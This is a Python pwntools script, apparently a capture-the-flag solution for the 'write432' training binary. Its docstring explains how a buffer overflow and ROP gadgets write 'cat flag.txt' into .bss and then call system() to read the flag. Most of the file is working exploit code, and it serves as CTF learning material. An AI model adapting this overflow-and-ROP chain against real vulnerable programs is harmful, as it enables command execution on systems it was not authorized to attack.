"""
In here we will try to construct write-what-where via ROP chain

It looks like this is the gadget we are searching for:

g1: 0x8048670: mov [edi],ebp; ret

g2: 0x80486da: pop edi; pop ebp; ret

 +-----+
 | ret |
 +-----+
 | g2  |
 +-----+
 | edi |
 +-----+
 | ebp |
 +-----+
 | g1  | <- will write ebp to given address [edi]
 +-----+
 
63617420 = 'cat '
666c6167 = 'flag'
2e747874 = '.txt'
00000000 = '\x00\x00\x00\x00'

and remember - LE !

0x20746163
0x67616c66
0x7478742e

[easy encoding tip: from pwntools: "'cat '.encode('hex')" ]

We will have to obtain writable memory address: 0x0804a040 <- .bss

"""

from pwn import *



def genpayload(what, where):
    padding = 'A'*44
    payload = padding
    payload += p32(0x080486da)  # pop edi; pop ebp; ret
    payload += p32(where)  	# .bss section
    payload += p32(what)  	# 'cat '
    payload += p32(0x08048670)  # mov [edi], ebp; ret
    payload += p32(0x080485f6)  # back to pwnme you fool...
    return payload

p = process('./write432')
p.clean()

p.sendline(genpayload(0x20746163, 0x0804a040))
p.sendline(genpayload(0x67616c66, 0x0804a044))
p.sendline(genpayload(0x7478742e, 0x0804a048))

payload = 'A'*44
payload += p32(0x08048430)	# system@plt
payload += p32(0)	    	# ret from system@plt (does not matter)
payload += p32(0x0804a040)
p.sendline(payload)
log.info('flag: ' + p.recv())
p.close()
